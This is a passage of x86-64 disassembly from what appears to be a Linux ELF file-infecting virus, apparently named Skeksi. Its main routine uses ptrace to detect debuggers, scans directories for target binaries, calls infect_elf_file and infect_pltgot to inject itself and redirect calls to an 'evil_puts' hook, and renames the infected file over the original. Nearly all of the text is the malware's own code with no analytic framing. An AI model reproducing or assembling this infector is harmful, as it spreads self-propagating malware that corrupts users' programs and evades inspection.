  401df1:	e8 ae 05 00 00       	call   4023a4 <_ptrace>
  401df6:	48 85 c0             	test   rax,rax
  401df9:	79 1d                	jns    401e18 <do_main+0xb1>
  401dfb:	48 8d 3d d1 10 00 00 	lea    rdi,[rip+0x10d1]        # 402ed3 <display_skeksi+0x12c>
  401e02:	b8 00 00 00 00       	mov    eax,0x0
  401e07:	e8 f7 06 00 00       	call   402503 <_printf>
  401e0c:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  401e13:	e8 3c 03 00 00       	call   402154 <Exit>
  401e18:	41 b8 00 00 00 00    	mov    r8d,0x0
  401e1e:	b9 00 00 00 00       	mov    ecx,0x0
  401e23:	ba 00 00 00 00       	mov    edx,0x0
  401e28:	be 00 00 00 00       	mov    esi,0x0
  401e2d:	bf 04 00 00 00       	mov    edi,0x4
  401e32:	e8 a7 05 00 00       	call   4023de <_prctl>
  401e37:	b8 00 00 00 00       	mov    eax,0x0
  401e3c:	e8 f9 02 00 00       	call   40213a <_getuid>
  401e41:	85 c0                	test   eax,eax
  401e43:	74 09                	je     401e4e <do_main+0xe7>
  401e45:	48 8d 85 de 7c ff ff 	lea    rax,[rbp-0x8322]
  401e4c:	eb 0f                	jmp    401e5d <do_main+0xf6>
  401e4e:	48 8d 85 e0 7c ff ff 	lea    rax,[rbp-0x8320]
  401e55:	48 89 c7             	mov    rdi,rax
  401e58:	e8 97 e6 ff ff       	call   4004f4 <randomly_select_dir>
  401e5d:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  401e61:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401e65:	48 8d 35 81 10 00 00 	lea    rsi,[rip+0x1081]        # 402eed <display_skeksi+0x146>
  401e6c:	48 89 c7             	mov    rdi,rax
  401e6f:	e8 52 0e 00 00       	call   402cc6 <_strcmp>
  401e74:	85 c0                	test   eax,eax
  401e76:	75 07                	jne    401e7f <do_main+0x118>
  401e78:	c7 45 f8 01 00 00 00 	mov    DWORD PTR [rbp-0x8],0x1
  401e7f:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401e83:	ba 00 00 00 00       	mov    edx,0x0
  401e88:	be 00 00 01 00       	mov    esi,0x10000
  401e8d:	48 89 c7             	mov    rdi,rax
  401e90:	e8 da 02 00 00       	call   40216f <_open>
  401e95:	89 45 e4             	mov    DWORD PTR [rbp-0x1c],eax
  401e98:	83 7d e4 00          	cmp    DWORD PTR [rbp-0x1c],0x0
  401e9c:	0f 88 92 02 00 00    	js     402134 <do_main+0x3cd>
  401ea2:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401ea9:	48 89 c7             	mov    rdi,rax
  401eac:	e8 88 f0 ff ff       	call   400f39 <load_self>
  401eb1:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  401eb4:	48 8d 8d 90 7f ff ff 	lea    rcx,[rbp-0x8070]
  401ebb:	ba 00 80 00 00       	mov    edx,0x8000
  401ec0:	48 89 ce             	mov    rsi,rcx
  401ec3:	89 c7                	mov    edi,eax
  401ec5:	e8 52 05 00 00       	call   40241c <_getdents64>
  401eca:	89 45 e0             	mov    DWORD PTR [rbp-0x20],eax
  401ecd:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401ed1:	0f 88 60 02 00 00    	js     402137 <do_main+0x3d0>
  401ed7:	83 7d e0 00          	cmp    DWORD PTR [rbp-0x20],0x0
  401edb:	0f 84 f5 01 00 00    	je     4020d6 <do_main+0x36f>
  401ee1:	c7 45 dc 00 00 00 00 	mov    DWORD PTR [rbp-0x24],0x0
  401ee8:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401eef:	e9 d1 01 00 00       	jmp    4020c5 <do_main+0x35e>
  401ef4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ef7:	48 98                	cdqe   
  401ef9:	48 8d 95 90 7f ff ff 	lea    rdx,[rbp-0x8070]
  401f00:	48 01 d0             	add    rax,rdx
  401f03:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401f07:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401f0b:	0f b7 40 10          	movzx  eax,WORD PTR [rax+0x10]
  401f0f:	0f b7 c0             	movzx  eax,ax
  401f12:	83 e8 01             	sub    eax,0x1
  401f15:	01 45 fc             	add    DWORD PTR [rbp-0x4],eax
  401f18:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401f1c:	48 83 c0 13          	add    rax,0x13
  401f20:	48 8d 35 c8 0f 00 00 	lea    rsi,[rip+0xfc8]        # 402eef <display_skeksi+0x148>
  401f27:	48 89 c7             	mov    rdi,rax
  401f2a:	e8 97 0d 00 00       	call   402cc6 <_strcmp>
  401f2f:	85 c0                	test   eax,eax
  401f31:	0f 84 80 01 00 00    	je     4020b7 <do_main+0x350>
  401f37:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401f3b:	0f b6 40 13          	movzx  eax,BYTE PTR [rax+0x13]
  401f3f:	3c 2e                	cmp    al,0x2e
  401f41:	0f 84 73 01 00 00    	je     4020ba <do_main+0x353>
  401f47:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  401f4b:	48 8d 48 13          	lea    rcx,[rax+0x13]
  401f4f:	48 8d 55 90          	lea    rdx,[rbp-0x70]
  401f53:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401f57:	48 89 c6             	mov    rsi,rax
  401f5a:	48 89 cf             	mov    rdi,rcx
  401f5d:	e8 e2 e5 ff ff       	call   400544 <full_path>
  401f62:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401f66:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401f6a:	48 89 c7             	mov    rdi,rax
  401f6d:	e8 87 fc ff ff       	call   401bf9 <check_criteria>
  401f72:	85 c0                	test   eax,eax
  401f74:	0f 88 43 01 00 00    	js     4020bd <do_main+0x356>
  401f7a:	83 7d f4 00          	cmp    DWORD PTR [rbp-0xc],0x0
  401f7e:	74 43                	je     401fc3 <do_main+0x25c>
  401f80:	c7 45 9c 0a 00 00 00 	mov    DWORD PTR [rbp-0x64],0xa
  401f87:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401f8e:	be 00 00 00 00       	mov    esi,0x0
  401f93:	48 89 c7             	mov    rdi,rax
  401f96:	e8 b1 04 00 00       	call   40244c <_gettimeofday>
  401f9b:	48 8d 85 b0 7c ff ff 	lea    rax,[rbp-0x8350]
  401fa2:	48 83 c0 08          	add    rax,0x8
  401fa6:	48 89 c7             	mov    rdi,rax
  401fa9:	e8 02 e5 ff ff       	call   4004b0 <_rand>
  401fae:	99                   	cdq    
  401faf:	f7 7d 9c             	idiv   DWORD PTR [rbp-0x64]
  401fb2:	89 d0                	mov    eax,edx
  401fb4:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  401fb7:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  401fbb:	0f 85 ff 00 00 00    	jne    4020c0 <do_main+0x359>
  401fc1:	eb 01                	jmp    401fc4 <do_main+0x25d>
  401fc3:	90                   	nop
  401fc4:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401fcb:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401fcf:	48 89 d6             	mov    rsi,rdx
  401fd2:	48 89 c7             	mov    rdi,rax
  401fd5:	e8 7e f0 ff ff       	call   401058 <load_target>
  401fda:	48 8d 95 00 7d ff ff 	lea    rdx,[rbp-0x8300]
  401fe1:	48 8d 85 00 7e ff ff 	lea    rax,[rbp-0x8200]
  401fe8:	48 89 d6             	mov    rsi,rdx
  401feb:	48 89 c7             	mov    rdi,rax
  401fee:	e8 1b e9 ff ff       	call   40090e <infect_elf_file>
  401ff3:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401ff7:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  401ffe:	48 89 c7             	mov    rdi,rax
  402001:	e8 17 f0 ff ff       	call   40101d <unload_target>
  402006:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  40200d:	48 89 c6             	mov    rsi,rax
  402010:	48 8d 3d 19 0e 00 00 	lea    rdi,[rip+0xe19]        # 402e30 <display_skeksi+0x89>
  402017:	e8 42 f4 ff ff       	call   40145e <load_target_writeable>
  40201c:	e8 56 0d 00 00       	call   402d77 <get_rip>
  402021:	48 89 c2             	mov    rdx,rax
  402024:	48 8d 05 16 e2 ff ff 	lea    rax,[rip+0xffffffffffffe216]        # 400241 <_start>
  40202b:	48 01 c2             	add    rdx,rax
  40202e:	48 8d 05 4b 0d 00 00 	lea    rax,[rip+0xd4b]        # 402d80 <get_rip_label>
  402035:	48 29 c2             	sub    rdx,rax
  402038:	48 89 d0             	mov    rax,rdx
  40203b:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40203f:	e8 33 0d 00 00       	call   402d77 <get_rip>
  402044:	48 89 c2             	mov    rdx,rax
  402047:	48 8d 05 34 e2 ff ff 	lea    rax,[rip+0xffffffffffffe234]        # 400282 <evil_puts>
  40204e:	48 01 c2             	add    rdx,rax
  402051:	48 8d 05 28 0d 00 00 	lea    rax,[rip+0xd28]        # 402d80 <get_rip_label>
  402058:	48 29 c2             	sub    rdx,rax
  40205b:	48 89 d0             	mov    rax,rdx
  40205e:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  402062:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  402066:	48 2b 45 b0          	sub    rax,QWORD PTR [rbp-0x50]
  40206a:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  40206e:	48 8b 55 b8          	mov    rdx,QWORD PTR [rbp-0x48]
  402072:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  402076:	48 01 d0             	add    rax,rdx
  402079:	48 8d 50 40          	lea    rdx,[rax+0x40]
  40207d:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  402084:	48 89 d6             	mov    rsi,rdx
  402087:	48 89 c7             	mov    rdi,rax
  40208a:	e8 d5 f7 ff ff       	call   401864 <infect_pltgot>
  40208f:	48 8d 85 00 7d ff ff 	lea    rax,[rbp-0x8300]
  402096:	48 89 c7             	mov    rdi,rax
  402099:	e8 7f ef ff ff       	call   40101d <unload_target>
  40209e:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4020a2:	48 89 c6             	mov    rsi,rax
  4020a5:	48 8d 3d 84 0d 00 00 	lea    rdi,[rip+0xd84]        # 402e30 <display_skeksi+0x89>
  4020ac:	e8 ba 01 00 00       	call   40226b <_rename>
  4020b1:	83 45 f4 01          	add    DWORD PTR [rbp-0xc],0x1
  4020b5:	eb 0a                	jmp    4020c1 <do_main+0x35a>
  4020b7:	90                   	nop
  4020b8:	eb 07                	jmp    4020c1 <do_main+0x35a>
  4020ba:	90                   	nop
  4020bb:	eb 04                	jmp    4020c1 <do_main+0x35a>
  4020bd:	90                   	nop
  4020be:	eb 01                	jmp    4020c1 <do_main+0x35a>
  4020c0:	90                   	nop
  4020c1:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  4020c5:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4020c8:	3b 45 e0             	cmp    eax,DWORD PTR [rbp-0x20]
  4020cb:	0f 8c 23 fe ff ff    	jl     401ef4 <do_main+0x18d>
  4020d1:	e9 db fd ff ff       	jmp    401eb1 <do_main+0x14a>
  4020d6:	90                   	nop
  4020d7:	83 6d f8 01          	sub    DWORD PTR [rbp-0x8],0x1
  4020db:	83 7d f8 00          	cmp    DWORD PTR [rbp-0x8],0x0
  4020df:	7e 0f                	jle    4020f0 <do_main+0x389>
  4020e1:	8b 45 e4             	mov    eax,DWORD PTR [rbp-0x1c]
  4020e4:	89 c7                	mov    edi,eax
  4020e6:	e8 b6 00 00 00       	call   4021a1 <_close>
  4020eb:	e9 47 fd ff ff       	jmp    401e37 <do_main+0xd0>
  4020f0:	c7 45 98 32 00 00 00 	mov    DWORD PTR [rbp-0x68],0x32
  4020f7:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  4020fe:	be 00 00 00 00       	mov    esi,0x0
  402103:	48 89 c7             	mov    rdi,rax
  402106:	e8 41 03 00 00       	call   40244c <_gettimeofday>
  40210b:	48 8d 85 c0 7c ff ff 	lea    rax,[rbp-0x8340]
  402112:	48 83 c0 08          	add    rax,0x8
  402116:	48 89 c7             	mov    rdi,rax
  402119:	e8 92 e3 ff ff       	call   4004b0 <_rand>
  40211e:	99                   	cdq    
  40211f:	f7 7d 98             	idiv   DWORD PTR [rbp-0x68]
  402122:	89 d0                	mov    eax,edx
  402124:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  402127:	83 7d c4 07          	cmp    DWORD PTR [rbp-0x3c],0x7
  40212b:	75 0b                	jne    402138 <do_main+0x3d1>
  40212d:	e8 75 0c 00 00       	call   402da7 <display_skeksi>
  402132:	eb 04                	jmp    402138 <do_main+0x3d1>
  402134:	90                   	nop
  402135:	eb 01                	jmp    402138 <do_main+0x3d1>
  402137:	90                   	nop
  402138:	c9                   	leave  
  402139:	c3                   	ret    

000000000040213a <_getuid>:
  40213a:	55                   	push   rbp
  40213b:	48 89 e5             	mov    rbp,rsp
  40213e:	48 c7 c0 66 00 00 00 	mov    rax,0x66
  402145:	0f 05                	syscall 
  402147:	48 89 c0             	mov    rax,rax
  40214a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40214e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402152:	5d                   	pop    rbp
  402153:	c3                   	ret    

0000000000402154 <Exit>:
  402154:	55                   	push   rbp
  402155:	48 89 e5             	mov    rbp,rsp
  402158:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  40215c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402160:	48 89 c7             	mov    rdi,rax
  402163:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c
  40216a:	0f 05                	syscall 
  40216c:	90                   	nop
  40216d:	5d                   	pop    rbp
  40216e:	c3                   	ret    

000000000040216f <_open>:
  40216f:	55                   	push   rbp
  402170:	48 89 e5             	mov    rbp,rsp
  402173:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402177:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40217b:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40217f:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402183:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402187:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  40218b:	48 c7 c0 02 00 00 00 	mov    rax,0x2
  402192:	0f 05                	syscall 
  402194:	48 89 c0             	mov    rax,rax
  402197:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40219b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40219f:	5d                   	pop    rbp
  4021a0:	c3                   	ret    

00000000004021a1 <_close>:
  4021a1:	55                   	push   rbp
  4021a2:	48 89 e5             	mov    rbp,rsp
  4021a5:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4021a8:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4021ac:	48 c7 c0 03 00 00 00 	mov    rax,0x3
  4021b3:	0f 05                	syscall 
  4021b5:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021b9:	5d                   	pop    rbp
  4021ba:	c3                   	ret    

00000000004021bb <_read>:
  4021bb:	55                   	push   rbp
  4021bc:	48 89 e5             	mov    rbp,rsp
  4021bf:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021c3:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021c7:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4021cb:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4021cf:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4021d3:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4021d7:	48 c7 c0 00 00 00 00 	mov    rax,0x0
  4021de:	0f 05                	syscall 
  4021e0:	48 89 c0             	mov    rax,rax
  4021e3:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4021e7:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4021eb:	5d                   	pop    rbp
  4021ec:	c3                   	ret    

00000000004021ed <_write>:
  4021ed:	55                   	push   rbp
  4021ee:	48 89 e5             	mov    rbp,rsp
  4021f1:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4021f5:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4021f9:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4021fd:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402201:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402205:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402209:	48 c7 c0 01 00 00 00 	mov    rax,0x1
  402210:	0f 05                	syscall 
  402212:	48 89 c0             	mov    rax,rax
  402215:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402219:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40221d:	5d                   	pop    rbp
  40221e:	c3                   	ret    

000000000040221f <_fstat>:
  40221f:	55                   	push   rbp
  402220:	48 89 e5             	mov    rbp,rsp
  402223:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402227:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40222b:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40222f:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402233:	48 c7 c0 05 00 00 00 	mov    rax,0x5
  40223a:	0f 05                	syscall 
  40223c:	48 89 c0             	mov    rax,rax
  40223f:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402243:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402247:	5d                   	pop    rbp
  402248:	c3                   	ret    

0000000000402249 <_unlink>:
  402249:	55                   	push   rbp
  40224a:	48 89 e5             	mov    rbp,rsp
  40224d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402251:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402255:	48 c7 c0 57 00 00 00 	mov    rax,0x57
  40225c:	0f 05                	syscall 
  40225e:	48 89 c0             	mov    rax,rax
  402261:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402265:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402269:	5d                   	pop    rbp
  40226a:	c3                   	ret    

000000000040226b <_rename>:
  40226b:	55                   	push   rbp
  40226c:	48 89 e5             	mov    rbp,rsp
  40226f:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402273:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402277:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40227b:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40227f:	48 c7 c0 52 00 00 00 	mov    rax,0x52
  402286:	0f 05                	syscall 
  402288:	48 89 c0             	mov    rax,rax
  40228b:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40228f:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402293:	5d                   	pop    rbp
  402294:	c3                   	ret    

0000000000402295 <_lseek>:
  402295:	55                   	push   rbp
  402296:	48 89 e5             	mov    rbp,rsp
  402299:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40229d:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4022a1:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  4022a4:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4022a8:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4022ac:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  4022b0:	48 c7 c0 08 00 00 00 	mov    rax,0x8
  4022b7:	0f 05                	syscall 
  4022b9:	48 89 c0             	mov    rax,rax
  4022bc:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022c0:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022c4:	5d                   	pop    rbp
  4022c5:	c3                   	ret    

00000000004022c6 <_fsync>:
  4022c6:	55                   	push   rbp
  4022c7:	48 89 e5             	mov    rbp,rsp
  4022ca:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  4022cd:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  4022d1:	48 c7 c0 4a 00 00 00 	mov    rax,0x4a
  4022d8:	0f 05                	syscall 
  4022da:	48 89 c0             	mov    rax,rax
  4022dd:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4022e1:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4022e5:	5d                   	pop    rbp
  4022e6:	c3                   	ret    

00000000004022e7 <_mmap>:
  4022e7:	55                   	push   rbp
  4022e8:	48 89 e5             	mov    rbp,rsp
  4022eb:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4022ef:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4022f3:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  4022f7:	48 89 4d c0          	mov    QWORD PTR [rbp-0x40],rcx
  4022fb:	4c 89 45 b8          	mov    QWORD PTR [rbp-0x48],r8
  4022ff:	4c 89 4d b0          	mov    QWORD PTR [rbp-0x50],r9
  402303:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  402307:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40230b:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  40230f:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  402313:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  402317:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40231b:	48 8b 7d d8          	mov    rdi,QWORD PTR [rbp-0x28]
  40231f:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  402323:	48 8b 55 c8          	mov    rdx,QWORD PTR [rbp-0x38]
  402327:	4c 8b 55 c0          	mov    r10,QWORD PTR [rbp-0x40]
  40232b:	4c 8b 45 f8          	mov    r8,QWORD PTR [rbp-0x8]
  40232f:	4c 8b 4d f0          	mov    r9,QWORD PTR [rbp-0x10]
  402333:	48 c7 c0 09 00 00 00 	mov    rax,0x9
  40233a:	0f 05                	syscall 
  40233c:	48 89 c0             	mov    rax,rax
  40233f:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  402343:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
  402347:	5d                   	pop    rbp
  402348:	c3                   	ret    

0000000000402349 <_munmap>:
  402349:	55                   	push   rbp
  40234a:	48 89 e5             	mov    rbp,rsp
  40234d:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402351:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402355:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402359:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40235d:	48 c7 c0 0b 00 00 00 	mov    rax,0xb
  402364:	0f 05                	syscall 
  402366:	48 89 c0             	mov    rax,rax
  402369:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40236d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402371:	5d                   	pop    rbp
  402372:	c3                   	ret    

0000000000402373 <_mprotect>:
  402373:	55                   	push   rbp
  402374:	48 89 e5             	mov    rbp,rsp
  402377:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  40237b:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  40237f:	89 55 dc             	mov    DWORD PTR [rbp-0x24],edx
  402382:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  402386:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  40238a:	48 8b 55 dc          	mov    rdx,QWORD PTR [rbp-0x24]
  40238e:	48 c7 c0 0a 00 00 00 	mov    rax,0xa
  402395:	0f 05                	syscall 
  402397:	48 89 c0             	mov    rax,rax
  40239a:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  40239e:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023a2:	5d                   	pop    rbp
  4023a3:	c3                   	ret    

00000000004023a4 <_ptrace>:
  4023a4:	55                   	push   rbp
  4023a5:	48 89 e5             	mov    rbp,rsp
  4023a8:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4023ac:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023b0:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4023b4:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  4023b8:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023bc:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023c0:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  4023c4:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  4023c8:	48 c7 c0 65 00 00 00 	mov    rax,0x65
  4023cf:	0f 05                	syscall 
  4023d1:	48 89 c0             	mov    rax,rax
  4023d4:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  4023d8:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  4023dc:	5d                   	pop    rbp
  4023dd:	c3                   	ret    

00000000004023de <_prctl>:
  4023de:	55                   	push   rbp
  4023df:	48 89 e5             	mov    rbp,rsp
  4023e2:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  4023e6:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  4023ea:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  4023ee:	48 89 4d d0          	mov    QWORD PTR [rbp-0x30],rcx
  4023f2:	4c 89 45 c8          	mov    QWORD PTR [rbp-0x38],r8
  4023f6:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  4023fa:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  4023fe:	48 8b 55 d8          	mov    rdx,QWORD PTR [rbp-0x28]
  402402:	4c 8b 55 d0          	mov    r10,QWORD PTR [rbp-0x30]
  402406:	48 c7 c0 9d 00 00 00 	mov    rax,0x9d
  40240d:	0f 05                	syscall 
  40240f:	48 89 c0             	mov    rax,rax
  402412:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402416:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40241a:	5d                   	pop    rbp
  40241b:	c3                   	ret    

000000000040241c <_getdents64>:
  40241c:	55                   	push   rbp
  40241d:	48 89 e5             	mov    rbp,rsp
  402420:	89 7d ec             	mov    DWORD PTR [rbp-0x14],edi
  402423:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402427:	89 55 e8             	mov    DWORD PTR [rbp-0x18],edx
  40242a:	48 8b 7d ec          	mov    rdi,QWORD PTR [rbp-0x14]
  40242e:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402432:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  402436:	48 c7 c0 d9 00 00 00 	mov    rax,0xd9
  40243d:	0f 05                	syscall 
  40243f:	48 89 c0             	mov    rax,rax
  402442:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402446:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40244a:	5d                   	pop    rbp
  40244b:	c3                   	ret    

000000000040244c <_gettimeofday>:
  40244c:	55                   	push   rbp
  40244d:	48 89 e5             	mov    rbp,rsp
  402450:	48 89 7d e8          	mov    QWORD PTR [rbp-0x18],rdi
  402454:	48 89 75 e0          	mov    QWORD PTR [rbp-0x20],rsi
  402458:	48 8b 7d e8          	mov    rdi,QWORD PTR [rbp-0x18]
  40245c:	48 8b 75 e0          	mov    rsi,QWORD PTR [rbp-0x20]
  402460:	48 c7 c0 60 00 00 00 	mov    rax,0x60
  402467:	0f 05                	syscall 
  402469:	48 89 c0             	mov    rax,rax
  40246c:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  402470:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  402474:	5d                   	pop    rbp
  402475:	c3                   	ret    

0000000000402476 <_memcpy>:
  402476:	55                   	push   rbp
  402477:	48 89 e5             	mov    rbp,rsp
  40247a:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  40247e:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  402482:	89 55 cc             	mov    DWORD PTR [rbp-0x34],edx
  402485:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  402489:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
